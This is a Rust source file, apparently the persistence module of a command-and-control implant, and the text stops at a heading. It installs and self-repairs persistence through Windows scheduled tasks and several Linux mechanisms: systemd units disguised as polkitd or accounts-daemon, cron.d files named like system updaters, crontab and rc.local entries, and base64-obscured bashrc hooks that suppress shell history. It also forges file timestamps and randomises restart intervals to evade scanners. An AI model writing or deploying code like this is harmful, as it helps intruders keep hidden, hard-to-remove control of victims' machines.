use std::process::Command;

/// 审计修复（N4）：exe 路径以单引号嵌入 crontab/cron.d/rc.local/恢复脚本
/// 前，先确认不含能逃逸单引号上下文（或破坏 systemd ExecStart 行）的字符。
/// 自动选择的藏匿路径全部由 [A-Za-z0-9._/-] 组成，永远通过；操作员自定义
/// C2_PROC_PATH 带元字符时在这里被拒绝。
#[cfg(unix)]
fn exe_path_embeddable(p: &str) -> bool {
    p.starts_with('/')
        && p.chars().all(|c| c.is_ascii_alphanumeric()
            || matches!(c, '/' | '.' | '_' | '-' | '+' | '@' | '='))
}

pub fn install_persistence() -> String {
    #[cfg(windows)]
    {
        install_windows_persistence()
    }
    #[cfg(unix)]
    {
        install_linux_persistence()
    }
}

pub fn uninstall_persistence() -> String {
    #[cfg(windows)]
    {
        uninstall_windows_persistence()
    }
    #[cfg(unix)]
    {
        uninstall_linux_persistence()
    }
}

/// Verify persistence health and repair missing strategies. Called every 6h.
#[cfg(unix)]
pub fn verify_and_repair() -> String {
    let platform = crate::platform::detect();
    let exe = match crate::rootkit::get_exe_path() {
        Some(e) => e,
        None => return String::new(),
    };
    let exe_str = exe.to_string_lossy().to_string();
    // N4：与 install_linux_persistence 同一闸门——不安全路径不修复、不重装。
    if !exe_path_embeddable(&exe_str) {
        crate::debug_log("persist verify: exe path contains shell-unsafe characters, skipping repairs");
        return String::new();
    }
    let mut repaired = Vec::new();

    // 1. systemd service (root only)
    if platform.is_root {
        let svc_name = systemd_service_name(platform.distro);
        let svc_path = format!("/etc/systemd/system/{}", svc_name);
        let still_ok = std::path::Path::new(&svc_path).exists()
            && std::fs::read_to_string(&svc_path)
                .map(|c| c.contains(&exe_str))
                .unwrap_or(false);
        if !still_ok {
            match install_systemd_service(&exe_str, platform.distro) {
                Ok(_) => { repaired.push("systemd"); crate::debug_log("persist verify: repaired systemd"); }
                Err(e) => crate::debug_log(&format!("persist verify: systemd repair failed: {}", e)),
            }
        }
    }

    // 2. user crontab — check by marker (path-independent)
    let cron_ok = Command::new("crontab")
        .args(&["-l"])
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.contains(CRON_MARKER) && s.contains(&exe_str))
        .unwrap_or(false);
    if !cron_ok {
        match install_user_crontab(&exe_str) {
            Ok(_) => { repaired.push("crontab"); crate::debug_log("persist verify: repaired crontab"); }
            Err(e) => crate::debug_log(&format!("persist verify: crontab repair failed: {}", e)),
        }
    }

    // 3. bashrc/profile — check for the marker string in EVERY expected file.
    // `install_bashrc_profile` encodes exe_path in base64, so the raw exe_str is NOT
    // present in the file. Checking exe_str directly always returns false → infinite reinstall.
    // We only check for the marker here; install_bashrc_profile internally handles the
    // "stale path" case (marker present but base64-encoded path changed).
    // Per-file check: the old `.any()` let one surviving file mask the deletion
    // of every other profile file.
    let profile_paths_list = profile_paths(platform.distro, platform.is_root);
    let profile_marker = "_sys_locale_check";
    let profile_ok = profile_paths_list.iter().all(|p| {
        match std::fs::read_to_string(p) {
            Ok(c) => c.contains(profile_marker),
            Err(_) => false,
        }
    });
    if !profile_ok {
        match install_bashrc_profile(&exe_str, platform.distro) {
            Ok(_) => { repaired.push("profile"); crate::debug_log("persist verify: repaired profile"); }
            Err(e) => crate::debug_log(&format!("persist verify: profile repair failed: {}", e)),
        }
    }

    // 4. rc.local (root only)
    if platform.is_root {
        let rc_path = rc_local_path(platform.distro);
        let rc_ok = std::fs::read_to_string(rc_path)
            .map(|c| c.contains(&exe_str))
            .unwrap_or(false);
        if !rc_ok {
            match install_rc_local(&exe_str, platform.distro) {
                Ok(_) => { repaired.push("rc.local"); crate::debug_log("persist verify: repaired rc.local"); }
                Err(e) => crate::debug_log(&format!("persist verify: rc.local repair failed: {}", e)),
            }
        }
    }

    // 5. system cron.d (root only) — Strategy 2
    if platform.is_root {
        let cron_name = system_cron_name(platform.distro);
        let cron_path = format!("/etc/cron.d/{}", cron_name);
        let cron_ok = std::fs::read_to_string(&cron_path)
            .map(|c| c.contains(&exe_str))
            .unwrap_or(false);
        if !cron_ok {
            match install_system_cron(&exe_str, platform.distro) {
                Ok(_) => { repaired.push("cron.d"); crate::debug_log("persist verify: repaired cron.d"); }
                Err(e) => crate::debug_log(&format!("persist verify: cron.d repair failed: {}", e)),
            }
        }
    }

    // 6. devshm recovery trio (root only, only when running from /dev/shm) — Strategy 6
    //    cron.d <name>-recovery + persistent /var/tmp backup + recovery script.
    //    If the agent lives in tmpfs and this chain is gone, a reboot loses it.
    if platform.is_root && exe_str.starts_with("/dev/shm/") {
        let cron_name = system_cron_name(platform.distro);
        let recovery_cron = format!("/etc/cron.d/{}-recovery", cron_name);
        let persistent_backup: &'static str = if matches!(
            platform.distro,
            crate::platform::Distro::CentOS | crate::platform::Distro::RHEL
        ) {
            "/var/tmp/.polkitd"
        } else {
            "/var/tmp/.accounts-daemon"
        };
        let rc_script: &'static str = if matches!(
            platform.distro,
            crate::platform::Distro::CentOS | crate::platform::Distro::RHEL
        ) { "/var/tmp/.polkitd-rc.sh" } else { "/var/tmp/.acctd-rc.sh" };
        let devshm_ok = std::path::Path::new(&recovery_cron).exists()
            && std::path::Path::new(persistent_backup).exists()
            && std::path::Path::new(rc_script).exists();
        if !devshm_ok {
            match install_devshm_recovery(&exe_str, platform.distro) {
                Ok(_) => { repaired.push("devshm-recovery"); crate::debug_log("persist verify: repaired devshm recovery"); }
                Err(e) => crate::debug_log(&format!("persist verify: devshm recovery repair failed: {}", e)),
            }
        }
    }

    // 7. user-level systemd service (non-root) — Strategy 7
    if !platform.is_root {
        // Only trust an absolute HOME with no parent-directory component.
        if let Ok(home) = std::env::var("HOME") {
            let home_path = std::path::PathBuf::from(&home);
            let home_valid = home_path.is_absolute()
                && !home_path.components().any(|c| matches!(c, std::path::Component::ParentDir));
            if home_valid {
                let user_svc = home_path.join(".config").join("systemd").join("user").join("dbus-broker-helper.service");
                let user_svc_ok = std::fs::read_to_string(&user_svc)
                    .map(|c| c.contains(&exe_str))
                    .unwrap_or(false);
                if !user_svc_ok {
                    match install_user_systemd_service(&exe_str) {
                        Ok(_) => { repaired.push("user-systemd"); crate::debug_log("persist verify: repaired user systemd"); }
                        Err(e) => crate::debug_log(&format!("persist verify: user systemd repair failed: {}", e)),
                    }
                }
            }
        }
    }
    if repaired.is_empty() {
        String::new()
    } else {
        format!("repaired: {}", repaired.join(", "))
    }
}

/// Windows：任务被清掉后 6 小时检查应重建，而不是空实现。
#[cfg(not(unix))]
pub fn verify_and_repair() -> String {
    #[cfg(windows)]
    {
        let ok = Command::new("schtasks")
            .args(["/query", "/tn", "SystemUpdate"])
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
        if ok {
            return String::new();
        }
        crate::debug_log("persist verify: Windows SystemUpdate missing, reinstalling");
        install_windows_persistence()
    }
    #[cfg(not(windows))]
    {
        String::new()
    }
}

// ============================================================
// Windows: unchanged
// ============================================================

#[cfg(windows)]
fn install_windows_persistence() -> String {
    let exe = match std::env::current_exe() {
        Ok(exe) => exe,
        Err(e) => return format!("Error: {}", e),
    };
    let username = whoami::username();

    let exe_str = match exe.to_str() {
        Some(path) => path,
        None => return "Error: Invalid executable path".to_string(),
    };
    let quoted_tr = format!("\"{}\"", exe_str);
    let result = Command::new("schtasks")
        .args(&[
            "/create",
            "/sc",
            "minute",
            "/mo",
            "5",
            "/tn",
            "SystemUpdate",
            "/tr",
            &quoted_tr,
            "/ru",
            &username,
            "/f",
        ])
        .output();

    match result {
        Ok(output) if output.status.success() => "Persistence installed".to_string(),
        Ok(output) => format!("Error: schtasks exited {}", output.status),
        Err(e) => format!("Error: {}", e),
    }
}

#[cfg(windows)]
fn uninstall_windows_persistence() -> String {
    let result = Command::new("schtasks")
        .args(&["/delete", "/tn", "SystemUpdate", "/f"])
        .output();

    match result {
        Ok(output) if output.status.success() => "Persistence removed".to_string(),
        Ok(output) => format!("Error: schtasks exited {}", output.status),
        Err(e) => format!("Error: {}", e),
    }
}

// ============================================================
// Linux: multi-strategy with distro/privilege awareness
// ============================================================

/// Disguise file timestamps to match a legitimate system file.
/// Picks the oldest available reference file to blend in.
#[cfg(unix)]
pub(crate) fn disguise_timestamp(path: &str) {
    let reference_files = [
        "/etc/systemd/system/systemd-journald.service",
        "/etc/systemd/system/systemd-logind.service",
        "/etc/crontab",
        "/etc/profile",
        "/etc/rc.local",
    ];

    for ref_file in &reference_files {
        if let Ok(metadata) = std::fs::metadata(ref_file) {
            if let Ok(modified) = metadata.modified() {
                use filetime::{FileTime, set_file_times};
                let ft = FileTime::from_system_time(modified);
                let _ = set_file_times(path, ft, ft);
                return;
            }
        }
    }
}

#[cfg(unix)]
fn install_linux_persistence() -> String {
    let platform = crate::platform::detect();
    let exe = match crate::rootkit::get_exe_path() {
        Some(e) => e,
        None => return "Failed to get exe path".to_string(),
    };
    let exe_str = exe.to_string_lossy().to_string();
    crate::debug_log(&format!("persist install: is_root={} exe={}", platform.is_root, exe_str));

    // 审计修复（N4）：exe 路径会被以单引号形式嵌入 crontab / cron.d /
    // rc.local / devshm 恢复脚本（以及 systemd ExecStart）。路径来自自动
    // 藏匿路径（安全）或操作员自定义 C2_PROC_PATH——含引号/反斜杠/$ 等
    // 元字符时会逃逸为任意命令。此处统一拦截：不安全的路径拒绝全部
    // 持久化策略（宁可没有持久化，也不要写一个会被利用的 cron 行）。
    if !exe_path_embeddable(&exe_str) {
        crate::debug_log(&format!(
            "persist install: exe path contains shell-unsafe characters, refusing: {:?}", exe_str));
        return "Error: exe path contains shell-unsafe characters ('\"`\\$;|&<>() or control chars); persistence skipped".to_string();
    }

    let mut results = Vec::new();

    // Strategy 1: systemd service (root only)
    if platform.is_root {
        match install_systemd_service(&exe_str, platform.distro) {
            Ok(msg) => { crate::debug_log(&format!("persist systemd: ok ({})", msg)); results.push(format!("systemd: {}", msg)); }
            Err(e) => { crate::debug_log(&format!("persist systemd: FAILED ({})", e)); results.push(format!("systemd: FAILED ({})", e)); }
        }
    }

    // Strategy 2: system cron /etc/cron.d/ (root only)
    if platform.is_root {
        match install_system_cron(&exe_str, platform.distro) {
            Ok(msg) => { crate::debug_log(&format!("persist cron.d: ok ({})", msg)); results.push(format!("cron.d: {}", msg)); }
            Err(e) => { crate::debug_log(&format!("persist cron.d: FAILED ({})", e)); results.push(format!("cron.d: FAILED ({})", e)); }
        }
    }

    // Strategy 3: user crontab (root + non-root)
    match install_user_crontab(&exe_str) {
        Ok(msg) => { crate::debug_log(&format!("persist crontab: ok ({})", msg)); results.push(format!("crontab: {}", msg)); }
        Err(e) => { crate::debug_log(&format!("persist crontab: FAILED ({})", e)); results.push(format!("crontab: FAILED ({})", e)); }
    }

    // Strategy 4: rc.local (root only)
    if platform.is_root {
        match install_rc_local(&exe_str, platform.distro) {
            Ok(msg) => { crate::debug_log(&format!("persist rc.local: ok ({})", msg)); results.push(format!("rc.local: {}", msg)); }
            Err(e) => { crate::debug_log(&format!("persist rc.local: FAILED ({})", e)); results.push(format!("rc.local: FAILED ({})", e)); }
        }
    }

    // Strategy 5: bashrc/profile (root + non-root)
    match install_bashrc_profile(&exe_str, platform.distro) {
        Ok(msg) => { crate::debug_log(&format!("persist profile: ok ({})", msg)); results.push(format!("profile: {}", msg)); }
        Err(e) => { crate::debug_log(&format!("persist profile: FAILED ({})", e)); results.push(format!("profile: FAILED ({})", e)); }
    }

    // Strategy 7: systemd user service (non-root)
    if !platform.is_root {
        match install_user_systemd_service(&exe_str) {
            Ok(msg) => { crate::debug_log(&format!("persist user-systemd: ok ({})", msg)); results.push(format!("user-systemd: {}", msg)); }
            Err(_) => {}
        }
    }

    // Strategy 6: /dev/shm fallback (root, tmpfs)
    if platform.is_root && exe_str.starts_with("/dev/shm/") {
        let platform_clone = platform.distro;
        match install_devshm_recovery(&exe_str, platform_clone) {
            Ok(msg) => { crate::debug_log(&format!("persist devshm-recovery: ok ({})", msg)); results.push(format!("devshm-recovery: {}", msg)); }
            Err(e) => { crate::debug_log(&format!("persist devshm-recovery: FAILED ({})", e)); results.push(format!("devshm-recovery: FAILED ({})", e)); }
        }
    }

    if results.is_empty() {
        "No persistence strategy available".to_string()
    } else {
        results.join("; ")
    }
}

#[cfg(unix)]
fn uninstall_linux_persistence() -> String {
    let platform = crate::platform::detect();
    let exe = match crate::rootkit::get_exe_path() {
        Some(e) => e,
        None => return "Failed to get exe path".to_string(),
    };
    let exe_str = exe.to_string_lossy().to_string();

    let mut results = Vec::new();

    if platform.is_root {
        results.push(uninstall_systemd_service(platform.distro));
        results.push(uninstall_system_cron(platform.distro));
        results.push(uninstall_rc_local(platform.distro));
        results.push(uninstall_devshm_recovery(platform.distro));
    }

    results.push(uninstall_user_crontab(&exe_str));
    results.push(uninstall_bashrc_profile(&exe_str, platform.distro));

    if !platform.is_root {
        results.push(uninstall_user_systemd_service());
    }

    results.join("; ")
}

// ---- Strategy 1: systemd service ----

#[cfg(unix)]
fn systemd_service_name(distro: crate::platform::Distro) -> &'static str {
    match distro {
        crate::platform::Distro::CentOS
        | crate::platform::Distro::RHEL
        | crate::platform::Distro::Amazon => "polkitd.service",
        _ => "accounts-daemon.service",
    }
}

#[cfg(unix)]
fn systemd_service_description(distro: crate::platform::Distro) -> &'static str {
    match distro {
        crate::platform::Distro::CentOS
        | crate::platform::Distro::RHEL
        | crate::platform::Distro::Amazon => "Authorization Manager",   // matches polkitd
        _ => "Account Service",                                          // matches accounts-daemon
    }
}

#[cfg(unix)]
fn install_systemd_service(
    exe_str: &str,
    distro: crate::platform::Distro,
) -> Result<String, String> {
    let service_name = systemd_service_name(distro);
    let description = systemd_service_description(distro);
    let service_path = format!("/etc/systemd/system/{}", service_name);

    // DAEMONIZED=1 prevents the agent from trying to double-fork again when
    // started by systemd.  Without this, Type=simple sees the main process
    // exit (after forking) and marks the service as failed, which causes
    // systemd to kill the orphaned child — especially noticeable on
    // RHEL 9 / Rocky Linux 9 with strict cgroup enforcement.
    // systemd ExecStart: no quotes around the path — systemd splits on spaces itself,
    // and quoting the whole path can cause "Executable path is not absolute" errors.
    // If the path contains spaces (rare), escape them with \x20 instead of quotes.
    let content = format!(
        r#"[Unit]
Description={}
After=network.target

[Service]
Type=simple
Environment="DAEMONIZED=1"
ExecStart={}
Restart=on-failure
RestartSec={}

[Install]
WantedBy=multi-user.target
"#,
        description, exe_str,
        // Randomize RestartSec to avoid fixed-value fingerprinting by security scanners.
        // Range 37-73s: odd numbers that don't look like round defaults (30/60/120).
        37 + (std::process::id() % 37)
    );

    std::fs::write(&service_path, content).map_err(|e| e.to_string())?;
    disguise_timestamp(&service_path);

    let _ = Command::new("systemctl").args(&["daemon-reload"]).output();
    let _ = Command::new("systemctl")
        .args(&["enable", service_name])
        .output();
    // Do NOT start now  ?current instance is already running.
    // The service will activate on next reboot.

    Ok("installed".to_string())
}

#[cfg(unix)]
fn uninstall_systemd_service(distro: crate::platform::Distro) -> String {
    let service_name = systemd_service_name(distro);
    let service_path = format!("/etc/systemd/system/{}", service_name);

    let _ = Command::new("systemctl")
        .args(&["stop", service_name])
        .output();
    let _ = Command::new("systemctl")
        .args(&["disable", service_name])
        .output();
    let _ = std::fs::remove_file(&service_path);
    let _ = Command::new("systemctl").args(&["daemon-reload"]).output();

    "systemd removed".to_string()
}

// ---- Strategy 2: system cron /etc/cron.d/ ----

#[cfg(unix)]
fn system_cron_name(distro: crate::platform::Distro) -> &'static str {
    match distro {
        crate::platform::Distro::CentOS
        | crate::platform::Distro::RHEL
        | crate::platform::Distro::Amazon => "yum-cron-update",
        _ => "apt-daily-upgrade",
    }
}

#[cfg(unix)]
fn install_system_cron(
    exe_str: &str,
    distro: crate::platform::Distro,
) -> Result<String, String> {
    let cron_name = system_cron_name(distro);
    let cron_path = format!("/etc/cron.d/{}", cron_name);

    let content = format!(
        "@reboot root {} >/dev/null 2>&1\n",
        exe_str
    );

    std::fs::write(&cron_path, content).map_err(|e| e.to_string())?;
    disguise_timestamp(&cron_path);
    let _ = Command::new("chmod")
        .args(&["600", &cron_path])
        .output();

    Ok("installed".to_string())
}

#[cfg(unix)]
fn uninstall_system_cron(distro: crate::platform::Distro) -> String {
    let cron_name = system_cron_name(distro);
    let cron_path = format!("/etc/cron.d/{}", cron_name);
    let _ = std::fs::remove_file(&cron_path);
    "cron.d removed".to_string()
}

// ---- Strategy 3: user crontab ----

/// Fixed marker comment that uniquely identifies the C2 crontab entry.
/// Using a marker instead of the exe path means path changes (e.g. non-root redeploy from a
/// different location) don't create duplicate entries, and uninstall is path-independent.
const CRON_MARKER: &str = "# _svc_locale_init";

/// Common helper for writing a new crontab; uses /var/tmp to reduce /tmp race conditions.
#[cfg(unix)]
fn write_crontab(content: &str) -> Result<(), String> {
    // Prefer /var/tmp (more restricted), fall back to /run or /tmp
    let tmp_dir = ["/var/tmp", "/run", "/tmp"]
        .iter()
        .find(|d| std::path::Path::new(d).is_dir())
        .copied()
        .unwrap_or("/tmp");
    let tmp_path = format!("{}/.ct_{}", tmp_dir, std::process::id());

    std::fs::write(&tmp_path, content).map_err(|e| e.to_string())?;
    let out = Command::new("crontab")
        .arg(&tmp_path)
        .output()
        .map_err(|e| e.to_string())?;
    let _ = std::fs::remove_file(&tmp_path);

    if out.status.success() {
        Ok(())
    } else {
        Err(format!(
            "crontab failed (exit {}): {}",
            out.status,
            String::from_utf8_lossy(&out.stderr).trim()
        ))
    }
}

#[cfg(unix)]
fn install_user_crontab(exe_str: &str) -> Result<String, String> {
    // Direct binary invocation — no /bin/sh -c wrapper, no `sleep 3`.
    // The wrapper pattern (/bin/sh -c "sleep N && ...") is a common C2 indicator.
    // The agent itself has startup jitter built in, so no external sleep is needed.
    // The comment looks like a locale/locale-sync system marker.
    let cron_entry = format!(
        "@reboot '{}' >/dev/null 2>&1 {}",
        exe_str, CRON_MARKER
    );

    let current = Command::new("crontab")
        .args(&["-l"])
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .unwrap_or_default();

    // Check existence by marker (path-independent)
    if current.contains(CRON_MARKER) {
        // Marker present but exe path changed (non-root redeploy) — replace old entry
        if current.contains(exe_str) {
            return Ok("already exists".to_string());
        }
        // Path changed — replace old entry
        let cleaned: String = current
            .lines()
            .filter(|l| !l.contains(CRON_MARKER))
            .collect::<Vec<_>>()
            .join("\n");
        let new_crontab = if cleaned.trim().is_empty() {
            format!("{}\n", cron_entry)
        } else {
            format!("{}\n{}\n", cleaned.trim_end(), cron_entry)
        };
        write_crontab(&new_crontab)?;
        return Ok("updated (path changed)".to_string());
    }

    // Marker absent — append new entry
    let new_crontab = if current.trim().is_empty() {
        format!("{}\n", cron_entry)
    } else {
        format!("{}\n{}\n", current.trim_end(), cron_entry)
    };
    write_crontab(&new_crontab)?;
    Ok("installed".to_string())
}

#[cfg(unix)]
fn uninstall_user_crontab(exe_str: &str) -> String {
    let current = Command::new("crontab")
        .args(&["-l"])
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .unwrap_or_default();

    // Match both marker and exe path to handle both old (no marker) and new entries
    let new_crontab: String = current
        .lines()
        .filter(|line| !line.contains(CRON_MARKER) && !line.contains(exe_str))
        .collect::<Vec<_>>()
        .join("\n");

    if new_crontab.trim().is_empty() {
        let _ = Command::new("crontab").args(&["-r"]).output();
    } else {
        let _ = write_crontab(&format!("{}\n", new_crontab.trim_end()));
    }

    "crontab removed".to_string()
}

// ---- Strategy 4: rc.local ----

/// rc.local path (distro-aware). Also auto-fix executable bit for CentOS.
#[cfg(unix)]
fn rc_local_path(distro: crate::platform::Distro) -> &'static str {
    match distro {
        crate::platform::Distro::CentOS
        | crate::platform::Distro::RHEL
        | crate::platform::Distro::Amazon => "/etc/rc.d/rc.local",
        _ => "/etc/rc.local",
    }
}

#[cfg(unix)]
fn ensure_rc_local_executable(path: &str) {
    let _ = Command::new("chmod").args(&["+x", path]).output();
    // Only try to enable rc-local.service if the unit file actually exists
    // (removed in RHEL 9 / Ubuntu 22+; calling enable on a missing unit produces error logs)
    let has_unit = Command::new("systemctl")
        .args(&["cat", "rc-local.service"])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false);
    if has_unit {
        let _ = Command::new("systemctl")
            .args(&["enable", "rc-local"])
            .output();
    }
}

#[cfg(unix)]
fn install_rc_local(
    exe_str: &str,
    distro: crate::platform::Distro,
) -> Result<String, String> {
    let rc_path = rc_local_path(distro);

    if let Ok(content) = std::fs::read_to_string(rc_path) {
        if content.contains(exe_str) {
            return Ok("already exists".to_string());
        }
    }

    ensure_rc_local_executable(rc_path);

    let append = format!("{} >/dev/null 2>&1 &\n", exe_str);

    // Read current content to check for 'exit 0' and trailing newline.
    // On distros without a pre-existing rc.local (Ubuntu 22+, RHEL 9) we create
    // the file from scratch — it MUST start with a shebang or rc-local.service
    // execve()s it and fails with ENOEXEC, silently killing this strategy.
    // This also covers the empty-file case (read of a missing file → "").
    let current = {
        let c = std::fs::read_to_string(rc_path).unwrap_or_default();
        if c.is_empty() { "#!/bin/sh\n".to_string() } else { c }
    };

    // If file ends with 'exit 0', insert our command BEFORE it
    let new_content = if let Some(exit_pos) = current.rfind("exit 0") {
        // Insert before the last 'exit 0' line
        let before = current[..exit_pos].trim_end_matches('\n');
        format!("{}\n{}\nexit 0\n", before, append.trim_end())
    } else {
        // Append normally, ensuring trailing newline
        let prefix = if current.is_empty() || current.ends_with('\n') {
            current.clone()
        } else {
            format!("{}\n", current)
        };
        format!("{}{}", prefix, append)
    };

    std::fs::write(rc_path, &new_content).map_err(|e| e.to_string())?;
    disguise_timestamp(rc_path);

    let _ = Command::new("chmod").args(&["+x", rc_path]).output();

    Ok("installed".to_string())
}

#[cfg(unix)]
fn uninstall_rc_local(distro: crate::platform::Distro) -> String {
    let rc_path = rc_local_path(distro);

    if let Ok(content) = std::fs::read_to_string(rc_path) {
        let exe = match crate::rootkit::get_exe_path() {
            Some(e) => e.to_string_lossy().to_string(),
            None => return "skipped".to_string(),
        };
        let new_content: String = content
            .lines()
            .filter(|line| !line.contains(&exe))
            .collect::<Vec<_>>()
            .join("\n");
        let _ = std::fs::write(rc_path, new_content);
    }

    "rc.local removed".to_string()
}

// ---- Strategy 5: bashrc / profile ----

#[cfg(unix)]
fn profile_paths(distro: crate::platform::Distro, is_root: bool) -> Vec<String> {
    let home = if is_root {
        "/root".to_string()
    } else {
        std::env::var("HOME").unwrap_or_else(|_| {
            format!("/home/{}", whoami::username())
        })
    };

    let mut paths = Vec::new();

    match distro {
        crate::platform::Distro::CentOS
        | crate::platform::Distro::RHEL
        | crate::platform::Distro::Amazon => {
            paths.push(format!("{}/.bash_profile", home));
            paths.push(format!("{}/.bashrc", home));
        }
        _ => {
            paths.push(format!("{}/.bashrc", home));
            paths.push(format!("{}/.profile", home));
        }
    }

    paths
}

#[cfg(unix)]
fn install_bashrc_profile(
    exe_str: &str,
    distro: crate::platform::Distro,
) -> Result<String, String> {
    let is_root = unsafe { libc::geteuid() == 0 };
    let paths = profile_paths(distro, is_root);
    let marker = "_sys_locale_check";

    let lock_path = if is_root {
        "/var/tmp/.systemd/inhibit.lock".to_string()
    } else {
        // Non-root: use XDG runtime dir or home fallback
        std::env::var("HOME")
            .map(|h| format!("{}/.local/share/inhibit.lock", h))
            .unwrap_or_else(|_| "/tmp/.inhibit.lock".to_string())
    };

    // Encode exe path as base64 to obscure it from casual inspection of .bashrc.
    // `cat ~/.bashrc` will show the encoded string rather than the binary path directly.
    // This adds one layer of indirection — not true obfuscation, but raises the bar.
    let exe_b64: String = {
        // Simple manual base64 encode (avoid adding a new crate)
        let bytes = exe_str.as_bytes();
        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::with_capacity((bytes.len() * 4 / 3) + 4);
        for chunk in bytes.chunks(3) {
            let b0 = chunk[0] as usize;
            let b1 = if chunk.len() > 1 { chunk[1] as usize } else { 0 };
            let b2 = if chunk.len() > 2 { chunk[2] as usize } else { 0 };
            out.push(alphabet[b0 >> 2] as char);
            out.push(alphabet[((b0 & 3) << 4) | (b1 >> 4)] as char);
            if chunk.len() > 1 { out.push(alphabet[((b1 & 0xf) << 2) | (b2 >> 6)] as char); } else { out.push('='); }
            if chunk.len() > 2 { out.push(alphabet[b2 & 0x3f] as char); } else { out.push('='); }
        }
        out
    };
    let lck_b64: String = {
        let bytes = lock_path.as_bytes();
        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::with_capacity((bytes.len() * 4 / 3) + 4);
        for chunk in bytes.chunks(3) {
            let b0 = chunk[0] as usize;
            let b1 = if chunk.len() > 1 { chunk[1] as usize } else { 0 };
            let b2 = if chunk.len() > 2 { chunk[2] as usize } else { 0 };
            out.push(alphabet[b0 >> 2] as char);
            out.push(alphabet[((b0 & 3) << 4) | (b1 >> 4)] as char);
            if chunk.len() > 1 { out.push(alphabet[((b1 & 0xf) << 2) | (b2 >> 6)] as char); } else { out.push('='); }
            if chunk.len() > 2 { out.push(alphabet[b2 & 0x3f] as char); } else { out.push('='); }
        }
        out
    };

    let payload_line = format!(
        concat!(
            "\n_xe=$(echo '{exe_b64}' | base64 -d 2>/dev/null);\n",
            "if [ -z \"${{_LOCALE_CHK}}\" ] && [ -n \"$_xe\" ] && [ -f \"$_xe\" ]; then",
            " export _LOCALE_CHK=1;",
            " _lk=$(echo '{lck_b64}' | base64 -d 2>/dev/null);",
            " if command -v flock >/dev/null 2>&1 && [ -n \"$_lk\" ]; then",
            " flock -n \"$_lk\" bash -c",
            " 'HISTFILE=/dev/null HISTSIZE=0 \"$1\" >/dev/null 2>&1 & disown $!' -- \"$_xe\" 2>/dev/null;",
            " else",
            " bash -c 'HISTFILE=/dev/null HISTSIZE=0 \"$1\" >/dev/null 2>&1 & disown $!' -- \"$_xe\" 2>/dev/null;",
            " fi;",
            " unset _xe _lk;",
            " fi\n"
        ),
        exe_b64 = exe_b64, lck_b64 = lck_b64
    );

    let mut installed = 0;
    use std::io::Write;

    for path in &paths {
        let current = std::fs::read_to_string(path).unwrap_or_default();

        if current.contains(marker) || current.contains(exe_str) {
            // Already installed — check for corruption OR stale path:
            // 1. Corruption: marker appears mid-line (not at start), caused by missing trailing newline.
            //    e.g. "export PATH=/usr/bin# _sys_locale_check" → bash syntax error.
            // 2. Stale path: marker exists but points to old exe path (e.g. user→root upgrade).
            //    Old hook references deleted binary → silently fails to start agent.
            let has_corruption = current.lines().any(|line| {
                if !line.contains(marker) { return false; }
                !line.trim_start().starts_with('#')
            });

            // Stale path: marker is clean but exe_b64 is NOT in the file
            // (hook references an old binary path; exe_str is base64-encoded in the file)
            let has_stale_path = current.contains(marker) && !current.contains(&exe_b64);

            if !has_corruption && !has_stale_path {
                continue; // clean, up-to-date installation → skip
            }

            // Repair: remove old agent hook (marker comment + if-block), re-add correctly.
            //
            // Hook format written to file:
            //   Line A: "# _sys_locale_check"            ← marker comment
            //   Line B: ""                               ← empty (leading \n in payload_line)
            //   Line C: "if [ -z "${_LOCALE_CHK}" ] ... fi"  ← entire block on ONE line
            //
            // The corruption is marker appearing mid-line (Line A merged with previous line).
            // We must:
            //   1. Preserve content BEFORE marker on the corrupted line
            //   2. Remove the marker line itself
            //   3. Remove the empty line that follows
            //   4. Remove the if-block line (contains _LOCALE_CHK)
            // Failure to remove the if-block causes a DOUBLE HOOK — the old one runs first,
            // sets _LOCALE_CHK=1, and the new one never fires, silently breaking persistence.
            let if_check = "_LOCALE_CHK";
            let fixed: String = {
                let mut out: Vec<String> = Vec::new();
                for line in current.lines() {
                    // Marker line (possibly corrupted / mid-line)
                    if line.contains(marker) {
                        if let Some(idx) = line.find(&format!("# {}", marker)) {
                            if idx > 0 {
                                let before = line[..idx].trim_end();
                                if !before.is_empty() {
                                    out.push(before.to_string());
                                }
                            }
                        }
                        continue; // skip marker line entirely
                    }
                    // If-block line (single line, contains the check var)
                    if line.contains(if_check) {
                        continue; // skip old if-block
                    }
                    out.push(line.to_string());
                }
                let mut s = out.join("\n");
                if !s.ends_with('\n') { s.push('\n'); }
                s
            };

            // Write repaired content back
            if std::fs::write(path, fixed.as_bytes()).is_err() {
                continue;
            }
            disguise_timestamp(path);
            // Fall through to re-append the correct hook
        }

        if let Some(parent) = std::path::Path::new(path).parent() {
            let _ = std::fs::create_dir_all(parent);
        }

        let mut file = std::fs::OpenOptions::new()
            .append(true)
            .create(true)
            .open(path)
            .map_err(|e| e.to_string())?;

        // Ensure file ends with newline before appending.
        // After repair the file always ends with \n; for new files we must check.
        let needs_newline = std::fs::read(path)
            .map(|b| !b.is_empty() && b.last() != Some(&b'\n'))
            .unwrap_or(false);
        if needs_newline {
            file.write_all(b"\n").map_err(|e| e.to_string())?;
        }

        // Add marker + payload
        let entry = format!("# {}\n{}", marker, payload_line);
        file.write_all(entry.as_bytes())
            .map_err(|e| e.to_string())?;
        disguise_timestamp(path);

        installed += 1;
    }

    if installed > 0 {
        Ok(format!("{} files patched", installed))
    } else {
        Ok("already exists or no writable profiles".to_string())
    }
}

#[cfg(unix)]
fn uninstall_bashrc_profile(exe_str: &str, distro: crate::platform::Distro) -> String {
    let is_root = unsafe { libc::geteuid() == 0 };
    let paths = profile_paths(distro, is_root);
    let marker = "_sys_locale_check";

    for path in &paths {
        if let Ok(content) = std::fs::read_to_string(path) {
            let new_content: String = content
                .lines()
                .filter(|line| {
                    !line.contains(exe_str)
                        && !line.contains(marker)
                        && !line.contains("_LOCALE_CHK")
                })
                .collect::<Vec<_>>()
                .join("\n");
            let _ = std::fs::write(path, new_content);
        }
    }

    "profile removed".to_string()
}

// ---- Strategy 6: /dev/shm recovery (tmpfs fallback) ----

